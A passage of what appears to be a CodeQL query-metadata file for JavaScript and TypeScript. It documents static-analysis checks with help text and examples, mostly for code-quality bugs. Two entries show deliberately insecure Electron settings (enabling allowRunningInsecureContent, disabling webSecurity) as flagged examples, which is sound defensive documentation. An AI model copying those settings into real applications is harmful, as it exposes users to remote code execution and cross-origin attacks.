                    the function is not yet defined at the point where it is referenced.
    kind: problem
    problem.severity: error
    id: js/nested-function-reference-in-default-parameter
    tags: |-
      quality
             reliability
             correctness
    precision: very-high
  queryHelp: |
    # Default parameter references nested function
    Default parameter values can only refer to variables and functions that are defined before the parameter. In particular, they cannot refer to nested functions defined inside the function body, since their definition is not evaluated until after default parameter values have been computed.


    ## Recommendation
    Move the function into the enclosing scope so that it becomes available to the default parameter.


    ## Example
    In the following example, the default parameter value for the parameter `y` of the function `f` is computed from the value of the parameter `x` using the function `defaultVal`. However, since `defaultVal` is defined inside `f` itself, it is not yet defined at the point where the default value of `y` is evaluated, which will lead to a runtime error.


    ```javascript
    function f(x, y = defaultVal(x)) {
        function defaultVal(x) {
            return x+19;
        }
        return x*y;
    }

    ```
    To fix this problem, `defaultVal` should be moved into the outer scope so that it becomes available to `y`:


    ```javascript
    function defaultVal(x) {
        return x+19;
    }

    function f(x, y = defaultVal(x)) {
        return x*y;
    }

    ```

    ## References
    * Mozilla Developer Network: [Default parameters](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Default_parameters).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/DuplicateVarDecl.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/DuplicateVarDecl.bqrs
  metadata:
    name: Duplicate variable declaration
    description: |-
      A variable declaration statement that declares the same variable twice is
                    confusing and hard to maintain.
    kind: problem
    problem.severity: recommendation
    id: js/duplicate-variable-declaration
    tags: |-
      quality
             maintainability
             readability
    precision: very-high
  queryHelp: |
    # Duplicate variable declaration
    A variable declaration statement that declares the same variable twice is confusing and hard to maintain.


    ## Recommendation
    Remove one of the two declarations. When removing a declaration with an initializer, further changes may be necessary to ensure that the variable is correctly initialized.


    ## Example
    In the following example, the variable declaration statement declares the variable `dom` twice. The second declaration is unnecessary, and since it has no initializer it can simply be removed.


    ```javascript
    var dom,
        contactDetails,
        phonesTemplate,
        emailsTemplate,
        dom;

    ```

    ## References
    * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Section 12.2. ECMA, 2011.
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/IneffectiveParameterType.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/IneffectiveParameterType.bqrs
  metadata:
    name: Ineffective parameter type
    description: Omitting the name of a parameter causes its type annotation to be
      parsed as the name.
    kind: problem
    problem.severity: warning
    id: js/ineffective-parameter-type
    precision: high
    tags: |-
      quality
             reliability
             correctness
             typescript
  queryHelp: |
    # Ineffective parameter type
    In TypeScript, the parameters of a function signature must have a name and may optionally have a type. A common mistake is to try to omit the name. This means the type is instead seen as the name. As a result, the parameter type will default to `any` since no type was given.

    Parameter names in function signatures are only relevant for documentation purposes but cannot be omitted.


    ## Recommendation
    Give both a name and type to the parameter, as it cannot be given a type without having a name. Alternatively, if the parameter is intentionally untyped, change its name so it does not coincide with a type name.


    ## Example
    In the following example, the callback parameter is written as `(T) => string`, which actually means `(T: any) => string` and is not useful for type checking or code completion.


    ```javascript
    function join<T>(items: T[], callback: (T) => string) {
      return items.map(callback).join(", ")
    }

    ```
    Amend this by changing the callback type to `(item: T) => string`. The parameter name `item` is only relevant for documentation purposes, but a name is required regardless.


    ```javascript
    function join<T>(items: T[], callback: (item: T) => string) {
      return items.map(callback).join(", ")
    }

    ```
    Untyped parameters are illegal when compiling with the TypeScript flag `--noImplicitAny`.


    ## References
    * [TypeScript Handbook, Functions](https://www.typescriptlang.org/docs/handbook/functions.html)
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/MissingThisQualifier.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/MissingThisQualifier.bqrs
  metadata:
    name: Missing 'this' qualifier
    description: Referencing an undeclared global variable in a class that has a member
      of the same name is confusing and may indicate a bug.
    kind: problem
    problem.severity: error
    id: js/missing-this-qualifier
    tags: |-
      quality
             reliability
             correctness
             methods
    precision: high
  queryHelp: "# Missing 'this' qualifier\nJavaScript methods can call other methods\
    \ of the same class instance through the use of the `this` keyword. In other object-oriented\
    \ languages such as Java, the use of the `this` keyword for such method calls\
    \ is optional. It is however *not* optional in JavaScript. If the `this` keyword\
    \ is left out, the call is a regular function call.\n\n\n## Recommendation\nAdd\
    \ the `this` keyword as the receiver of the call.\n\n\n## Example\nIn the following\
    \ example, the call to `setAudioProperties` will call an undeclared global function,\
    \ and *not* the method defined later in the class.\n\n\n```javascript\nclass Audio3D\
    \ {\n  setAudioStream(){\n    // ...\n    setAudioProperties();\n    // ...\n\
    \  }\n\n  setAudioProperties(){\n    // ...  \n  }\n}\n```\nThe problem can be\
    \ fixed by adding the `this` keyword to the call: `this.setAudioProperties()`.\n\
    \n\n## References\n* MDN: [Classes](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes)\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/MissingVarDecl.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/MissingVarDecl.bqrs
  metadata:
    name: Missing variable declaration
    description: |-
      If a variable is not declared as a local variable, it becomes a global variable
                    by default, which may be unintentional and could lead to unexpected behavior.
    kind: problem
    problem.severity: warning
    id: js/missing-variable-declaration
    tags: |-
      quality
             reliability
             correctness
    precision: high
  queryHelp: "# Missing variable declaration\nIn JavaScript, if a variable is used\
    \ in a function but not declared as a local variable, it becomes a global variable\
    \ by default. This can have unintended consequences: unlike local variables, global\
    \ variables can be read and modified by all functions. If different functions\
    \ use the same global variable, they may end up overwriting each others values,\
    \ leading to subtle and difficult to diagnose bugs.\n\n\n## Recommendation\nCheck\
    \ whether the variable in question was meant to be local; if so, declare it by\
    \ means of a `var` declaration. If the variable is really meant to be global,\
    \ it is best to document this fact by inserting a global `var` declaration at\
    \ the beginning of the source file.\n\n\n## Example\nIn the following example,\
    \ both `f` and `g` use a loop counter variable `i`. Since neither of them declares\
    \ `i` to be a local variable, they end up accessing the same global variable,\
    \ so every time `f` invokes `g` inside the loop, `g` overwrites `f`'s value for\
    \ `i`.\n\n\n```javascript\nfunction f(a) {\n\tvar sum = 0;\n\tfor (i=0; i<a.length;\
    \ ++i)\n\t\tsum += g(a[i]);\n\treturn sum;\n}\n\nfunction g(b) {\n\tvar prod =\
    \ 1;\n\tfor (i=0; i<b.length; ++i)\n\t\tprod *= b[i];\n\treturn prod;\n}\n```\n\
    The example should be fixed by declaring `i` to be a local variable in `f` and\
    \ `g`.\n\n\n## References\n* D. Crockford, *JavaScript: The Good Parts*, Appendix\
    \ A. O'Reilly, 2008.\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/MixedStaticInstanceThisAccess.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/MixedStaticInstanceThisAccess.bqrs
  metadata:
    name: Wrong use of 'this' for static method
    description: "A reference to a static method from within an instance method needs\
      \ to be qualified with the class name, not `this`."
    kind: problem
    problem.severity: error
    id: js/mixed-static-instance-this-access
    tags: |-
      quality
             reliability
             correctness
             methods
    precision: high
  queryHelp: |
    # Wrong use of 'this' for static method
    A method of a class can be either a static method or an instance method. For a static method, the value of `this` is the enclosing class. For an instance method, the value of `this` is the object instance itself. It is therefore not possible to refer to a static method from an instance method using `this`, and vice versa.


    ## Recommendation
    A reference to an instance method from within a static method needs to be qualified with an instance of the class, and not `this`.


    ## Example
    In the following code snippet, the `bar` method is an instance method and it attempts to use the static `baz` method through `this`. That is not possible, so the call will fail at runtime.


    ```javascript
    class Foo {
        bar(){
            this.baz(42);
        }
        static baz(x){
            // ...
        }
    }

    ```
    The code should be changed to use the enclosing class instead of `this`: `Foo.baz(42)`.


    ## References
    * Mozilla Developer Network: [Classes and static methods](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes/static).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/SuspiciousMethodNameDeclaration.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/SuspiciousMethodNameDeclaration.bqrs
  metadata:
    name: Suspicious method name declaration
    description: |-
      A method declaration with a name that is a special keyword in another
                    context is suspicious.
    kind: problem
    problem.severity: warning
    id: js/suspicious-method-name-declaration
    precision: high
    tags: |-
      quality
             reliability
             correctness
             typescript
             methods
  queryHelp: |
    # Suspicious method name declaration
    In TypeScript, certain keywords have special meanings for member declarations, and misusing them can create confusion:

    * In classes, use `constructor` rather than `new` to declare constructors. Using `new` within a class creates a method named "new" and not a constructor signature.
    * In interfaces, use `new` rather than `constructor` to declare constructor signatures. Using `constructor` within an interface creates a method named "constructor" and not a constructor signature.
    * Similarly, the keyword `function` is used to declare functions in some contexts. However, using the name `function` for a class or interface member declaration declares a method named "function".
    When these keywords are misused, TypeScript will interpret them as regular method names rather than their intended special syntax, leading to code that may not work as expected.


    ## Recommendation
    Consider following these guidelines for clearer code:

    * For classes, use `constructor` to declare constructors.
    * For interfaces, use `new` to declare constructor signatures (call signatures that create new instances).
    * Avoid accidentally creating methods named `function` by misusing the `function` keyword within class or interface declarations.

    ## Example
    The following examples show common mistakes when using these keywords:

    This interface mistakenly uses `constructor`, which creates a method named "constructor" instead of a constructor signature:


    ```javascript
    // BAD: Using 'constructor' in an interface creates a method, not a constructor signature
    interface Point {
       x: number;
       y: number;
       constructor(x: number, y: number); // This is just a method named "constructor"
    }

    ```
    Use `new` for constructor signatures in interfaces:


    ```javascript
    // GOOD: Using 'new' for constructor signatures in interfaces
    interface Point {
       x: number;
       y: number;
       new(x: number, y: number): Point; // This is a proper constructor signature
    }

    ```
    This class mistakenly uses `new`, which creates a method named "new" instead of a constructor:


    ```javascript
    // BAD: Using 'new' in a class creates a method, not a constructor
    class Point {
       x: number;
       y: number;
       new(x: number, y: number) {}; // This is just a method named "new"
    }

    ```
    Use `constructor` for constructors in classes:


    ```javascript
    // GOOD: Using 'constructor' for constructors in classes
    class Point {
       x: number;
       y: number;
       constructor(x: number, y: number) { // This is a proper constructor
          this.x = x;
          this.y = y;
       }
    }

    ```
    This interface uses `function` as a method name, which declares a method named "function" rather than declaring a function:


    ```javascript
    // BAD: Using 'function' as a method name is confusing
    interface Calculator {
       function(a: number, b: number): number; // This is just a method named "function"
    }

    ```
    Use a descriptive method name instead:


    ```javascript
    // GOOD: Using descriptive method names instead of 'function'
    interface Calculator {
       calculate(a: number, b: number): number; // Clear, descriptive method name
    }

    ```

    ## References
    * TypeScript Handbook: [Classes - Constructors](https://www.typescriptlang.org/docs/handbook/2/classes.html#constructors).
    * TypeScript specification: [Constructor Type Literals](https://github.com/microsoft/TypeScript/blob/30cb20434a6b117e007a4959b2a7c16489f86069/doc/spec-ARCHIVED.md#3.8.9).
    * TypeScript specification: [Constructor Parameters](https://github.com/microsoft/TypeScript/blob/30cb20434a6b117e007a4959b2a7c16489f86069/doc/spec-ARCHIVED.md#8.3.1).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/TemporalDeadZone.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/TemporalDeadZone.bqrs
  metadata:
    name: Access to let-bound variable in temporal dead zone
    description: |-
      Accessing a let-bound variable before its declaration will lead to a runtime
                    error on ECMAScript 2015-compatible platforms.
    kind: problem
    problem.severity: error
    id: js/variable-use-in-temporal-dead-zone
    tags: |-
      quality
             reliability
             correctness
             portability
    precision: very-high
  queryHelp: |
    # Access to let-bound variable in temporal dead zone
    The scope of a variable declared with `let` is its innermost enclosing block statement, loop or function. Unlike variables declared with `var`, variables declared with `let` are not hoisted to the top of their scope, giving rise to a region of code where the variable is in scope, but not declared yet. Accessing a `let`-bound variable inside this so-called "temporal dead zone" is permitted by some legacy implementations, but is illegal in ECMAScript 2015.


    ## Recommendation
    Move the `let` declaration to the beginning of its scope.


    ## Example
    In the following example, `x` is initialized before its declaration:


    ```javascript
    function f() {
        x = 23;
        let x;
    }

    ```
    The declaration should be moved as follows:


    ```javascript
    function f() {
        let x;
        x = 23;
    }

    ```

    ## References
    * Mozilla Developer Network: [Temporal dead zone and errors with let](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let#Temporal_dead_zone_and_errors_with_let).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/UniqueParameterNames.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/UniqueParameterNames.bqrs
  metadata:
    name: Duplicate parameter names
    description: |-
      If a function has two parameters with the same name, the second parameter
                    shadows the first one, which makes the code hard to understand and error-prone.
    kind: problem
    problem.severity: error
    id: js/duplicate-parameter-name
    tags: |-
      quality
             reliability
             correctness
    precision: very-high
  queryHelp: "# Duplicate parameter names\nIn non-strict mode, JavaScript allows a\
    \ function to have several parameters with the same name, where later parameters\
    \ shadow earlier parameters. This is an error-prone feature which makes code hard\
    \ to understand and should be avoided.\n\n\n## Recommendation\nRename the parameters\
    \ to have different names.\n\n\n## Example\nIn the following example, function\
    \ `f` has two parameters named `x`, the second one presumably being a typo for\
    \ `y`. Since no parameter `y` is declared, the use of `y` in the body of `f` refers\
    \ to a global variable of that name, if it exists.\n\n\n```javascript\nfunction\
    \ f(x, x) {\n\treturn x+y;\n}\n```\nDuplicate parameter names are illegal in strict\
    \ mode.\n\n\n## References\n* Ecma International, *ECMAScript Language Definition*,\
    \ 5.1 Edition, Annex C. ECMA, 2011.\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/UniquePropertyNames.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/UniquePropertyNames.bqrs
  metadata:
    name: Overwritten property
    description: |-
      If an object literal has two properties with the same name,
                    the second property overwrites the first one,
                    which makes the code hard to understand and error-prone.
    kind: problem
    problem.severity: error
    id: js/overwritten-property
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-563
    precision: very-high
  queryHelp: "# Overwritten property\nIn ECMAScript 2015 and above, as well as ECMAScript\
    \ 5 non-strict mode, an object literal may define the same property multiple times,\
    \ with later definitions overwriting earlier ones. In particular, if the last\
    \ definition assigns a different value from earlier definitions, the earlier value\
    \ is lost, which is most likely unintentional and should be avoided.\n\n\n## Recommendation\n\
    Rename the properties to have different names.\n\n\n## Example\nIn the following\
    \ example, the object literal assigned to `point` has two definitions of property\
    \ `x`. The object's use in function `dist` suggests that the second definition\
    \ should define a property `y` instead, and should be renamed.\n\n\n```javascript\n\
    function dist(p) {\n\treturn Math.sqrt(p.x*p.x+p.y*p.y);\n}\n\nvar point = {\n\
    \tx: 3,\n\tx: 4\n};\nconsole.log(dist(point));\n```\n\n## References\n* Ecma International,\
    \ *ECMAScript Language Definition*, 5.1 Edition, Annex C. ECMA, 2011.\n* Ecma\
    \ International, *ECMAScript Language Definition*, 6th Edition, Annex E. ECMA,\
    \ 2015.\n* Common Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/UnreachableMethodOverloads.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/UnreachableMethodOverloads.bqrs
  metadata:
    name: Unreachable method overloads
    description: |-
      Having multiple overloads with the same parameter types in TypeScript
                    makes all overloads except the first one unreachable, as the compiler
                    always resolves calls to the textually first matching overload.
    kind: problem
    problem.severity: warning
    id: js/unreachable-method-overloads
    precision: high
    tags: |-
      quality
             reliability
             correctness
             typescript
  queryHelp: |
    # Unreachable method overloads
    The TypeScript compiler has to choose which specific overload is called when a method with multiple overloads is called. The compiler will always choose the textually first overload that does not give rise to any type errors with the arguments provided at the function call.

    This behavior can be unintuitive for programmers unfamiliar with the type system in TypeScript, and can in some instances lead to situations where a programmer writes an overloaded method where only the first overload can ever be used.


    ## Recommendation
    Either reorder the method overloads if an overload with more type parameters is placed before a similar overload with fewer parameters. Alternatively, collapse multiple overloads with identical parameter types by creating a single overload that returns a union of the return types from the multiple overloads.


    ## Example
    In the example below, a programmer has tried to express that a method can return multiple possible values by creating multiple overloads with identical parameter types. However, only the first overload will ever be selected by the TypeScript compiler.


    ```javascript
    interface Foo {
        getParsedThing(id: string): string[];
        getParsedThing(id: string): number[];
        getParsedThing(id: string): object[];
    }
    ```
    The error can be fixed by merging the overloads into a single method signature that returns a union of the previous return types.


    ```javascript
    interface Foo {
        getParsedThing(id: string): object[] | number[] | string[];
    }
    ```
    In the example below, an interface `Foo` declares a method `create()` with two overloads. The only difference between the two overloads is the type parameter `T` in the first overload. The TypeScript compiler will always use the first overload when `create()` is called, as a default type will be used for the type parameter `T` if none is provided. This default type is `unknown` in TypeScript 3.5+, and `{}` in earlier versions.


    ```javascript
    interface Foo {
        create<T>(a: string): MyObject<T>;
        create(a: string): MyObject<any>;
    }
    ```
    In this example, the error has been fixed by switching the order of the two overloads. In this fixed version, if the `create()` method is called with an explicit type argument the second overload will be used, as the first overload would give rise to a type error.


    ```javascript
    interface Foo {
        create(a: string): Array<any>;
        create<T>(a: string): Array<T>;
    }
    ```

    ## References
    * TypeScript specification: [Overload Resolution](https://github.com/microsoft/TypeScript/blob/30cb20434a6b117e007a4959b2a7c16489f86069/doc/spec-ARCHIVED.md#4.15.1)
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/UnusedVariable.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/UnusedVariable.bqrs
  metadata:
    name: "Unused variable, import, function or class"
    description: |-
      Unused variables, imports, functions or classes may be a symptom of a bug
                    and should be examined carefully.
    kind: problem
    problem.severity: recommendation
    id: js/unused-local-variable
    tags: |-
      quality
             maintainability
             useless-code
    precision: very-high
  queryHelp: "# Unused variable, import, function or class\nUnused local variables\
    \ make code hard to read and understand. Any computation used to initialize an\
    \ unused variable is wasted, which may lead to performance problems.\n\nSimilarly,\
    \ unused imports and unused functions or classes can be confusing. They may even\
    \ be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\
    \n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this\
    \ code, the function `f` initializes a local variable `x` with a call to the function\
    \ `expensiveComputation`, but later on this variable is never read. Removing `x`\
    \ would improve code quality and performance.\n\n\n```javascript\nfunction f()\
    \ {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle\
    \ case is shown below, where a function expression named `f` is assigned to a\
    \ variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n\
    };\nf();\n```\nNote that this example involves two distinct variables, both named\
    \ `f`: the global variable to which the function is assigned, and the variable\
    \ implicitly declared by the function expression. The call to `f()` refers to\
    \ the former variable, whereas the latter is unused. Hence the example can be\
    \ rewritten as follows, eliminating the useless variable:\n\n\n```javascript\n\
    var f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can\
    \ occur with ECMAScript 2015 module exports, as shown in the following example:\n\
    \n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\n\
    Again, the named function expression implicitly declares a variable `f`, but because\
    \ the export statement is a default export, this variable is unused and can be\
    \ eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\"\
    ;\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n\
    * Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n\
    * Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Diagnostics/ExtractedFiles.ql
  relativeBqrsPath: codeql/javascript-queries/Diagnostics/ExtractedFiles.bqrs
  metadata:
    name: Extracted files
    description: Lists all files in the source code directory that were extracted.
    kind: diagnostic
    id: js/diagnostics/successfully-extracted-files
    tags: successfully-extracted-files
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Diagnostics/ExtractionErrors.ql
  relativeBqrsPath: codeql/javascript-queries/Diagnostics/ExtractionErrors.bqrs
  metadata:
    name: Extraction errors
    description: List all extraction errors for files in the source code directory.
    kind: diagnostic
    id: js/diagnostics/extraction-errors
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Electron/AllowRunningInsecureContent.ql
  relativeBqrsPath: codeql/javascript-queries/Electron/AllowRunningInsecureContent.bqrs
  metadata:
    name: Enabling Electron allowRunningInsecureContent
    description: Enabling allowRunningInsecureContent can allow remote code execution.
    kind: problem
    problem.severity: error
    security-severity: 8.8
    precision: very-high
    tags: |-
      security
             frameworks/electron
             external/cwe/cwe-494
    id: js/enabling-electron-insecure-content
  queryHelp: |
    # Enabling Electron allowRunningInsecureContent
    Electron is secure by default through a policy banning the execution of content loaded over HTTP. Setting the `allowRunningInsecureContent` property of a `webPreferences` object to `true` will disable this policy.

    Enabling the execution of insecure content is strongly discouraged.


    ## Recommendation
    Do not enable the `allowRunningInsecureContent` property.


    ## Example
    The following example shows `allowRunningInsecureContent` being enabled.


    ```javascript
    const mainWindow = new BrowserWindow({
      webPreferences: {
        allowRunningInsecureContent: true
      }
    })
    ```
    This is problematic, since it allows the execution of code from an untrusted origin.


    ## References
    * Electron Documentation: [Security, Native Capabilities, and Your Responsibility](https://electronjs.org/docs/tutorial/security#8-do-not-set-allowrunninginsecurecontent-to-true)
    * Common Weakness Enumeration: [CWE-494](https://cwe.mitre.org/data/definitions/494.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Electron/DisablingWebSecurity.ql
  relativeBqrsPath: codeql/javascript-queries/Electron/DisablingWebSecurity.bqrs
  metadata:
    name: Disabling Electron webSecurity
    description: Disabling webSecurity can cause critical security vulnerabilities.
    kind: problem
    problem.severity: error
    security-severity: 6.1
    precision: very-high
    tags: |-
      security
             frameworks/electron
             external/cwe/cwe-079
    id: js/disabling-electron-websecurity
  queryHelp: |
    # Disabling Electron webSecurity
    Electron is secure by default through a same-origin policy requiring all JavaScript and CSS code to originate from the machine running the Electron application. Setting the `webSecurity` property of a `webPreferences` object to `false` will disable the same-origin policy.

    Disabling the same-origin policy is strongly discouraged.


    ## Recommendation
    Do not disable `webSecurity`.


    ## Example
    The following example shows `webSecurity` being disabled.


    ```javascript
    const mainWindow = new BrowserWindow({
      webPreferences: {
        webSecurity: false
      }
    })
    ```
    This is problematic, since it allows the execution of insecure code from other domains.


    ## References
    * Electron Documentation: [Security, Native Capabilities, and Your Responsibility](https://electronjs.org/docs/tutorial/security#5-do-not-disable-websecurity)
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/ComparisonWithNaN.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/ComparisonWithNaN.bqrs
  metadata:
    name: Comparison with NaN
    description: |-
      Arithmetic comparisons with NaN are useless: nothing is considered to be equal to NaN, not even NaN itself,
                    and similarly nothing is considered greater or less than NaN.
    kind: problem
    problem.severity: error
    id: js/comparison-with-nan
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-570
             external/cwe/cwe-571
    precision: very-high
  queryHelp: |
    # Comparison with NaN
    Arithmetic comparisons with the special not-a-number value `NaN` are useless: nothing is considered to be equal to `NaN`, not even `NaN` itself, and similarly nothing is considered greater or less than `NaN`.


    ## Recommendation
    Use the `isNaN` function from the standard library to determine whether a given value is `NaN`.


    ## Example
    Instead of `x === NaN`, use `isNaN(x)`.


    ## References
    * Arvind Kumar: [Javascript common mistake of comparing with NaN and not with isNaN](http://www.devarticles.in/javascript/javascript-common-mistake-of-comparing-variable-with-nan-and-not-with-isnan/).
    * Mozilla Developer Network: [NaN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/NaN).
    * Common Weakness Enumeration: [CWE-570](https://cwe.mitre.org/data/definitions/570.html).
    * Common Weakness Enumeration: [CWE-571](https://cwe.mitre.org/data/definitions/571.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/DuplicateCondition.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/DuplicateCondition.bqrs
  metadata:
    name: Duplicate 'if' condition
    description: |-
      If two conditions in an 'if'-'else if' chain are identical, the
                    second condition will never hold.
    kind: problem
    problem.severity: warning
    id: js/duplicate-condition
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-561
    precision: very-high
  queryHelp: "# Duplicate 'if' condition\nIf two conditions in an 'if'-'else if' chain\
    \ are identical, the second condition will never hold. This most likely indicates\
    \ a copy-paste error where the first condition was copied and then not properly\
    \ adjusted. Even if the duplication is intentional (relying, for instance, on\
    \ non-determinism or side effects), such code is confusing and should be avoided.\n\
    \n\n## Recommendation\nExamine the two conditions to find out what they were meant\
    \ to check. If both the conditions and the branches that depend on them are identical,\
    \ then the second branch is duplicate code that can be deleted. Otherwise, the\
    \ second condition needs to be adjusted.\n\n\n## Example\nIn the example below,\
    \ the function `controller` checks its parameter `msg` to determine what operation\
    \ it is meant to perform. However, the comparison in the 'else if' is identical\
    \ to the comparison in the 'if', so this branch will never be taken.\n\n\n```javascript\n\
    function controller(msg) {\n\tif (msg == 'start')\n\t\tstart();\n\telse if (msg\
    \ == 'start')\n\t\tstop();\n\telse\n\t\tthrow new Error(\"Message not understood.\"\
    );\n}\n```\nClearly, the 'else if' branch should compare `msg` to `'stop'`:\n\n\
    \n```javascript\nfunction controller(msg) {\n\tif (msg == 'start')\n\t\tstart();\n\
    \telse if (msg == 'stop')\n\t\tstop();\n\telse\n\t\tthrow new Error(\"Message\
    \ not understood.\");\n}\n```\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/DuplicateProperty.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/DuplicateProperty.bqrs
  metadata:
    name: Duplicate property
    description: |-
      Listing the same property twice in one object literal is
                    redundant and may indicate a copy-paste mistake.
    kind: problem
    problem.severity: warning
    id: js/duplicate-property
    tags: |-
      quality
             maintainability
             readability
             external/cwe/cwe-563
    precision: very-high
  queryHelp: |
    # Duplicate property
    In ECMAScript 2015 and above, as well as ECMAScript 5 non-strict mode, an object literal may define the same property multiple times, with later definitions overwriting earlier ones. If all definitions assign the same value to the property, this will not to lead to problems at runtime, but it makes the code harder to read and maintain.


    ## Recommendation
    Eliminate the spurious redefinition.


    ## Example
    In the following example, the object literal passed to method `css` has two definitions of property `backgroundColor`, both setting it to value `"orange"`.


    ```javascript
    $(".alert").css({
      backgroundColor: "orange",
      fontWeight: "bold",
      backgroundColor: "orange"
    });
    ```
    The second definition is spurious and should be removed:


    ```javascript
    $(".alert").css({
      backgroundColor: "orange",
      fontWeight: "bold"
    });
    ```

    ## References
    * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Annex C. ECMA, 2011.
    * Ecma International, *ECMAScript Language Definition*, 6th Edition, Annex E. ECMA, 2015.
    * Common Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/DuplicateSwitchCase.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/DuplicateSwitchCase.bqrs
  metadata:
    name: Duplicate switch case
    description: |-
      If two cases in a switch statement have the same label, the second case
                    will never be executed.
    kind: problem
    problem.severity: warning
    id: js/duplicate-switch-case
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-561
    precision: very-high
  queryHelp: "# Duplicate switch case\nIn JavaScript, cases in a switch statement\
    \ can have arbitrary expressions as their labels. The interpreter does not check\
    \ that these expressions are all different. At runtime, if two cases in a switch\
    \ statement have the same label, the second case will never be executed. This\
    \ most likely indicates a copy-paste error where the first case was copied and\
    \ then not properly adjusted.\n\n\n## Recommendation\nExamine the two cases to\
    \ find out what they were meant to check. If both the case labels and their statements\
    \ are identical, then the second case is duplicate code that can be deleted. Otherwise,\
    \ the second case label needs to be adjusted.\n\n\n## Example\nIn the example\
    \ below, the function `controller` checks its parameter `msg` to determine what\
    \ operation it is meant to perform. Note that the 'switch' statement has two cases\
    \ labeled `'start'`; the second one will never be executed.\n\n\n```javascript\n\
    function controller(msg) {\n\tswitch (msg) {\n\tcase 'start':\n\t\tstart();\n\t\
    \tbreak;\n\tcase 'start':\n\t\tstop();\n\t\tbreak;\n\tdefault:\n\t\tthrow new\
    \ Error(\"Message not understood.\");\n\t}\n}\n```\nClearly, the second case should\
    \ be labeled `'stop'`:\n\n\n```javascript\nfunction controller(msg) {\n\tswitch\
    \ (msg) {\n\tcase 'start':\n\t\tstart();\n\t\tbreak;\n\tcase 'stop':\n\t\tstop();\n\
    \t\tbreak;\n\tdefault:\n\t\tthrow new Error(\"Message not understood.\");\n\t\
    }\n}\n```\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Expressions/ExprHasNoEffect.ql
  relativeBqrsPath: codeql/javascript-queries/Expressions/ExprHasNoEffect.bqrs
  metadata:
    name: Expression has no effect
    description: |-
      An expression that has no effect and is used in a void context is most
                    likely redundant and may indicate a bug.
    kind: problem
    problem.severity: warning
    id: js/useless-expression
    tags: |-
      quality
             maintainability
             useless-code
             external/cwe/cwe-480
             external/cwe/cwe-561
    precision: very-high
  queryHelp: |
    # Expression has no effect
    An expression that has no effects (such as changing variable values or producing output) and occurs in a context where its value is ignored possibly indicates missing code or a latent bug.


    ## Recommendation
    Carefully inspect the expression to ensure it is not a symptom of a bug. To document that the value of an expression is deliberately ignored, wrap it into a `void` expression.


    ## Example
    The following code snippet accesses the `selectedIndex` property of a DOM node to trigger additional processing in certain versions of Safari. This, however, is not clear from the code itself, which looks like a property read whose value is discarded immediately.


    ```javascript
    elem.parentNode.selectedIndex;

    ```
    To document the fact that the property read has a hidden side effect and its value is deliberately ignored, it should be wrapped into a `void` expression like this:


    ```javascript
    void(elem.parentNode.selectedIndex);

    ```
    A common source of warnings are constructor functions that "declare" a property of the newly constructed object without initializing it, by simply referring to it in an expression statement like this:


    ```javascript
